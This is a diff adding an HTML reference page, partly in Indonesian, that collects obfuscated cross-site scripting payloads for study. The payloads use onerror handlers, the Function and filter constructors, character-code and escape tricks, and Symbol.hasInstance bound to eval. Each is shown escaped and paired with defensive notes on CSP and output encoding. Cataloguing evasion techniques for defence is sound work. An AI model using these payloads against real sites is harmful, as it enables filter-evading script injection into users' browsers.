@@ -1,0 +1,109 @@
+<!doctype html>
+<html lang="id">
+<head>
+  <meta charset="utf-8" />
+  <meta name="viewport" content="width=device-width,initial-scale=1" />
+  <title>Dios — Xcopath: Obfuscated XSS (manpage style)</title>
+  <style>
+    /* Terminal / manpage aesthetic */
+    :root{--bg:#0b1020;--panel:#0f1724;--accent:#9ae6b4;--muted:#94a3b8;--mono: "Fira Mono", "Roboto Mono", monospace}
+    body{margin:0;background:linear-gradient(180deg,var(--bg),#071022);color:#e6eef8;font-family:var(--mono);line-height:1.45;padding:28px}
+    .container{max-width:900px;margin:0 auto;background:linear-gradient(180deg,var(--panel),#091221);border-radius:12px;padding:26px;box-shadow:0 10px 40px rgba(0,0,0,.7)}
+    h1{font-size:20px;margin:0 0 6px;color:var(--accent)}
+    .meta{color:var(--muted);font-size:12px;margin-bottom:18px}
+    section{margin:16px 0}
+    .section-title{color:#cbd5e1;font-weight:700;font-size:13px;margin-bottom:8px}
+    pre{background:#071226;padding:12px;border-radius:8px;overflow:auto;color:#dbeafe;font-size:13px;white-space:pre-wrap}
+    code{font-family:var(--mono);font-size:13px}
+    .badge{display:inline-block;padding:2px 8px;border-radius:999px;background:#0f1724;color:var(--muted);font-size:11px;margin-right:8px}
+    .warning{background:#3b1a1a;color:#ffe6e6;padding:10px;border-radius:8px;font-size:13px;margin:8px 0}
+    ul{margin:8px 0 0 18px}
+    .muted{color:var(--muted);font-size:13px}
+    footer{margin-top:18px;color:var(--muted);font-size:12px}
+  </style>
+</head>
+<body>
+  <div class="container">
+    <h1>Dios — Xcopath: Obfuscated XSS</h1>
+    <div class="meta">
+      <span class="badge">manpage-style</span>
+      <span class="badge">for-repo</span>
+      <span class="muted">Last updated: <!-- you can edit this date --> 2025-10-12</span>
+    </div>
+
+    <section>
+      <div class="section-title">NAME</div>
+      <div class="muted">dios-xcopath — collection of obfuscated XSS snippets (documented, escaped, and explained)</div>
+    </section>
+
+    <section>
+      <div class="section-title">SYNOPSIS</div>
+      <div class="muted">
+        This document lists several obfuscated XSS examples for study and defensive research. <strong>All payloads are shown as escaped text</strong> to avoid accidental execution.
+      </div>
+    </section>
+
+    <section>
+      <div class="section-title">DESCRIPTION</div>
+      <p>
+        The snippets below were collected for research into client-side injection techniques and obfuscation patterns. Each example is followed by a short, high-level explanation of the technique used and defensive notes.
+      </p>
+      <div class="warning">
+        <strong>Ethics & safety:</strong> Do NOT test these payloads on systems you do not own or do not have explicit written permission to test. Use isolated lab environments only. Responsible disclosure applies if you find real vulnerabilities.
+      </div>
+    </section>
+
+    <section>
+      <div class="section-title">EXAMPLES</div>
+
+      <div class="muted">(All examples are HTML-escaped to prevent execution when viewing this file)</div>
+
+      <h4 style="margin-top:12px">1) Obfuscated XSS (simple)</h4>
+      <pre>&lt;img src onerror=alert`1`&gt;</pre>
+      <p class="muted">Ringkasan: penggunaan <code>onerror</code> pada elemen gambar tanpa atribut <code>src</code> valid dan pemanggilan fungsi via template literal-style (<code>alert`1`</code>) — contoh singkat obfuscation/shortcut.</p>
+
+      <h4 style="margin-top:12px">2) Basic (without direct eval)</h4>
+      <pre>&lt;img src onerror="Function`al\x65rt\x281\x29`()"&gt;</pre>
+      <p class="muted">Ringkasan: memanfaatkan constructor <code>Function</code> dan escape sequences untuk menyamarkan teks <code>alert(1)</code>. Menunjukkan teknik menghindari deteksi berbasis string literal.</p>
+
+      <h4 style="margin-top:12px">3) filter.constructor variants</h4>
+      <pre>&lt;img src onerror="[].filter.constructor('('+('al'+'ert')+')(1)')()"&gt;
+&lt;img src onerror="[].filter.constructor(''+String.fromCharCode(97,108,101,114,116)+'(1)')()"&gt;
+&lt;img src onerror="[].filter.constructor('\u0061\u006c\u0065\u0072\u0074(1)')()"&gt;
+&lt;img src onerror="[].filter.constructor('\x61\x6c\x65\x72\x74(1)')()"&gt;</pre>
+      <p class="muted">Ringkasan: semua varian memanggil constructor fungsi alternatif (<code>[].filter.constructor</code>) dan mengaburkan nama fungsi (<code>alert</code>) lewat concatenation, <code>fromCharCode</code>, Unicode escapes, dan hex escapes.</p>
+
+      <h4 style="margin-top:12px">4) Indirect function call obfuscation with <code>Symbol.hasInstance</code></h4>
+      <pre>&lt;img src onerror="([][Symbol.hasInstance]=eval,[]instanceof{[Symbol.hasInstance](){\u0061\u006c\u0065\u0072\u0074(0)}})"&gt;
+&lt;img src onerror="let _=alert+0,x='alert'+_[14]+_[15];Array.prototype[Symbol.hasInstance]=eval;x instanceof []"&gt;</pre>
+      <p class="muted">Ringkasan: teknik-teknik kreatif yang memakainya operator-builtins (<code>instanceof</code>, <code>Symbol.hasInstance</code>) untuk memicu evaluasi. Kompleksitasnya bertujuan mengaburkan alur eksekusi dari detektor sederhana.</p>
+    </section>
+
+    <section>
+      <div class="section-title">DEFENSIVE NOTES (high-level)</div>
+      <ul>
+        <li>Jangan mengandalkan blacklist sederhana pada kata tertentu (mis. "alert", "eval") — obfuscation dapat menyembunyikan kata-kata tersebut.</li>
+        <li>Prefer server-side output encoding/escaping sesuai konteks (HTML entity-encode untuk HTML body, attribute-encode untuk atribut, JS-escapes untuk inline scripts).</li>
+        <li>Gunakan Content Security Policy (CSP) yang ketat: nonces, sumber terpercaya, dan hindari <code>unsafe-inline</code> jika memungkinkan.</li>
+        <li>Hapus atau sanitasi atribut event handler (on\*) bila tidak diperlukan pada HTML yang dihasilkan dari input pengguna.</li>
+        <li>Gunakan HTTP-only & Secure untuk cookies; batasi hak akses DOM dan CORS kebijakan sesuai prinsip least privilege.</li>
+        <li>Audit library/template rendering engine yang dipakai — prefer template engines yang memaksa escaping secara default.</li>
+      </ul>
+    </section>
+
+    <section>
+      <div class="section-title">TESTING & LAB</div>
+      <p class="muted">Jika kamu melakukan penelitian, lakukan di lingkungan terisolasi (contoh: VM snapshot, container, atau lab sekolah). Catat setiap temuan dan laporkan kerentanan secara bertanggung jawab ke pemilik aplikasi sesuai kebijakan disclosure mereka.</p>
+    </section>
+
+    <section>
+      <div class="section-title">AUTHORS & LICENSE</div>
+      <p class="muted">Author: Dios by Xcopath (as collected). This document is intended for defensive research and education. License: add a license file in the repo (e.g., MIT) if you want to publish.</p>
+    </section>
+
+     <footer>
+      For inclusion in a GitHub repo: save as <code>README.html</code> or <code>docs/obfuscated-xss.html</code>. Keep payloads escaped to avoid accidental execution. Always test ethically.
+    </footer>
+  </div>
+</body>
+</html>
